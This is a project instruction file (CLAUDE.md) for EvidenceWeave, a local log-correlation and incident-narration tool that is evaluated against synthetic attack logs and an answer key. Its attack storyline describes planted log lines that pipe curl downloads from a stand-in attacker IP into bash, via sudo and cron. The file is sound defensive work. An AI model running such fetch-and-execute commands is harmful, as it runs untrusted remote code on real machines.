# EvidenceWeave — CLAUDE.md (single source of truth)

## Project overview
- EvidenceWeave is a log-correlation agent that reads mixed log sources (Linux auth.log, nginx/Apache access logs, Windows event logs as JSON).
- It normalizes them into one event schema.
- Deterministic correlation rules detect the attack chain.
- A local LLM (Ollama) writes an incident narrative where every sentence cites event IDs; a verifier checks those citations.
- Output is an HTML report, evaluated against a synthetic answer key.

## Hard constraints
- Completely free and local: Ollama only, no paid APIs.
- Python 3.10+.
- Minimal dependencies (requests, jinja2, pytest).
- Deterministic rules find the attack chain; the LLM only narrates.
- Every narrative claim must cite event IDs.

## Models
- Primary: `qwen2.5:7b-instruct` (override with env `EVIDENCEWEAVE_MODEL`).
- Secondary: `llama3.1:8b` (model comparison).
- Installed but unused: `qwen3-vl:8b-instruct`, `qwen3-vl:8b`. Do not pull any other models.

## Architecture
generator -> parsers -> normalized events -> correlation rules -> narrator -> verifier -> HTML report -> evaluation against the answer key

Package layout: `evidenceweave/{generator,parsers,correlation,narrator,verifier,report}`, plus `cli.py`, `schema.py`, `config.py`.

## Planned event schema
`event_id`, `timestamp` (UTC), `host`, `user`, `src_ip`, `source_type`, `action`, `raw_file`, `raw_line`, `raw_text`

## Attack storyline (implemented in Phase 1)
Attacker IP 203.0.113.45 throughout; compromised user `deploy`; new user `svc_backup`; pivot web01 = 10.0.0.5.
1. brute_force: 25-40 failed SSH passwords on web01 (invalid users, root, deploy)
2. initial_access: `Accepted password for deploy` from the attacker IP
3. privilege_escalation: `sudo ... curl -s http://203.0.113.45:8080/x.sh | bash`
4. persistence: `useradd` new user svc_backup + 4 CRON runs (`(svc_backup) CMD (curl ... b.sh | bash)`) in auth.log
5. lateral_movement (ws-fin01): 3-5x 4625, 4624 type 3 from 10.0.0.5, 4672, 4688 powershell `-Enc`, 4698 `\WindowsUpdateCheck`
6. web_recon: 26 nginx scan requests from the attacker IP (mostly 404, a few 200/403)
Steps 3/4/5 contain the attacker IP via the payload URL (no SSH IP exists on sudo/cron/Windows lines).

## Generator usage and answer key format
```powershell
python -m evidenceweave.cli generate --case case01 --difficulty easy --seed 42 [--out data/cases]
python -m evidenceweave.cli generate --case case02 --difficulty hard --seed 7
```
Output `data/cases/<case>/{logs/{linux_auth.log,nginx_access.log,windows_events.jsonl},answer_key.json,manifest.json}` (data/cases is gitignored; regenerate with the commands above).
`answer_key.json`: `case_name, seed, difficulty, attacker_ip, decoy_ips, compromised_user, created_user, clock_skew_seconds{source:sec}, time_note, steps[], benign_but_suspicious_looking[]`.
Each step: `step_id (1-6), name, description, start_time, end_time` (true UTC, ISO `...Z`), `status` (`complete` | `partially_unprovable`), `evidence[{source_file, line_number (1-based), event_marker}]`, `evidence_missing[{description, source_file, event_marker}]`.
Benign list items: `{source_file, line_number, event_marker, reason}`.
`manifest.json`: `case_name, seed, difficulty, generator_version, assumed_syslog_year (2026), line_counts, clock_skew_seconds`.
Hard mode: ~5x noise, decoy IP 198.51.100.23 (failed SSH + web scans, never succeeds), Windows clock +90s (logged = true + 90), useradd line for svc_backup deleted (step 4 partially unprovable), benign 4720 `temp_intern` and benign 4698 `GoogleUpdateTaskMachineCore`.
Line numbers are computed after merge/sort/deletion. Generator code: `evidenceweave/generator/{formats,attack,noise,key,core}.py`.
## Phase plan
- [x] Phase 0 Setup
- [x] Phase 1 Synthetic log generator + answer key
- [ ] Phase 2 Parsers + normalized schema
- [ ] Phase 3 Correlation rules
- [ ] Phase 4 LLM narrator with citations
- [ ] Phase 5 Citation verifier + retry loop
- [ ] Phase 6 HTML report + evaluation + demo prep

## Working rules (Claude Code)
- Work on one phase at a time; never start the next phase until the user says so.
- At the end of every phase update this file: tick the phase, add a progress log entry (date, what was built, files created, test results, decisions/problems).
- Keep the "Decisions" and "Open issues" sections current.
- Run tests before finishing a phase.

## Decisions
- venv built from the standard Windows Python 3.12 (`%LOCALAPPDATA%\Programs\Python\Python312`), not the MSYS2 `python` on PATH, which creates a non-standard `.venv/bin` layout without `Scripts\Activate.ps1`.

## Open issues
- Windows evidence in step 5 carries 10.0.0.5 (web01), not the external attacker IP; the attacker IP only appears via the 4698 task URL. Phase 3 rules must link the hosts through the pivot IP.
- Step times in the key are true UTC; Phase 2 parsers must correct the Windows skew (manifest has the offset; the correlator should not assume it blindly).

## Progress log
### Phase 0 — 2026-10-27
- Built: folder structure, venv, requirements.txt, .gitignore, config.py, schema.py (dataclass placeholder), CLI with placeholder subcommands, scripts/check_ollama.py, smoke tests.
- Files: `evidenceweave/{__init__,cli,schema,config}.py`, subpackage `__init__.py` files, `scripts/check_ollama.py`, `tests/test_smoke.py`, `requirements.txt`, `.gitignore`, `data/.gitkeep`, `CLAUDE.md`.
- check_ollama: qwen2.5:7b-instruct replied in 5.6s, llama3.1:8b in 11.1s (includes model load).
- Tests: see commit; smoke tests pass.

### Phase 1 — 2026-10-27
- Built: seeded generator (easy/hard), answer key + manifest, `generate` CLI command.
- Files: `evidenceweave/generator/{formats,attack,noise,key,core}.py`, `evidenceweave/cli.py` (generate), `tests/test_generator.py`.
- Cases: case01 easy seed 42 (265/426/96 lines, 81 evidence); case02 hard seed 7 (1111/2338/458 lines, 75 evidence, 1 missing).
- Tests: 13 passed (11 generator + 2 smoke).
- Decisions: independent `random.Random(f"{seed}/{part}")` streams; sudo/cron attack lines carry the attacker IP via payload URL; useradd runs in root shell so no sudo line leaks it; evidence_missing items are objects (description + marker) so tests can verify absence; generated cases not committed.
- Problems: first marker for cron session lines matched open+close lines; fixed by including "session opened".

## How to run (Windows PowerShell)
```powershell
.\.venv\Scripts\Activate.ps1        # activate venv
python -m pytest                    # run tests
python -m evidenceweave.cli --help  # run CLI
python scripts\check_ollama.py      # check Ollama + models
```

